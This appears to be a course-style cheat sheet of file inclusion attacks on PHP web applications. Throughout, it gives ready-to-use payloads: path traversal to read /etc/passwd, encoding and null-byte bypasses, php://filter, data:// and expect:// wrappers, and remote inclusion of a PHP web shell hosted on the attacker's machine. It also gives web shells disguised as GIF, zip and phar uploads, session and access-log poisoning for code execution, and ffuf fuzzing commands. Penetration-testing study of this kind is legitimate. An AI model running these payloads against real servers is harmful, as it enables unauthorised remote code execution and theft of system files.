Basic LFI
---

`http://<SERVER_IP>:<PORT>/index.php?language=/etc/passwd`

Bypass
---

Replacement:

`http://<SERVER_IP>:<PORT>/index.php?language=....//....//....//....//etc/passwd`


Encoding/Double Encoding:

`<SERVER_IP>:<PORT>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64`

Path Truncation: (adding 2048 `./` to truncate any thing appended to the input (`.php`, `.gif`)

`$ echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done`

Null Bytes:

`/etc/passwd%00` which will drop anythign appended behind like `/etc/passwd%00.php`

PHP input Filters
---

`php://filter/read=convert.base64-encode/resource=config`

PHP Wrappers
---

```
$ echo '<?php system($_GET["cmd"]); ?>' | base64

http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id

http://<SERVER_IP>:<PORT>/index.php?language=expect://id
```

Remote File Inclusion
---

```
$ echo '<?php system($_GET["cmd"]); ?>' > shell.php

$ python3 -m http.server 8080

http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```

```
$ echo '<?php system($_GET["cmd"]); ?>' > shell.php

$ python -m pyftpdlib -p 21

http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id
```

Staging Attacks with File Uploads
---

Upload a malicious file and include it with LFI

Image

```
$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif

http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
```

Zip

```
$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php

http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

Phar

shell.php

```
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

```
$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg

http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

Log Poisoning
---

### Cookie Poisioning and LFI

Given `PHPSESSID=nhhv8i0o6ua4g88bkdl9u1fdsd` Cookies are stored at `/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`

We can poison the variable, and LFI the cookie to trigger the code

Poisoning language preference with PHP code, and executing it with LFI

```
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E

http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```

### Log Poisoning and LFI

Likewise, we can insert code in variables that are logged, and LFI the log file for execution

Set `User-Agent: <?php system($_GET['cmd']); ?>` 

Then LFI the access log with `cmd=id`

`http://<SERVER_IP>:<PORT>/index.php?language=../../var/log/apache2/access.log&cmd=id`

### Memory Poisioning and LFI

Using the same approach, we can poision the memory in `/proc/self/environ`, `/proc/self/fd/<pid>` or `/proc/self/mem` and LFI to include the memory space for code execution

Scanning
---

```
$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287

$ ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
```
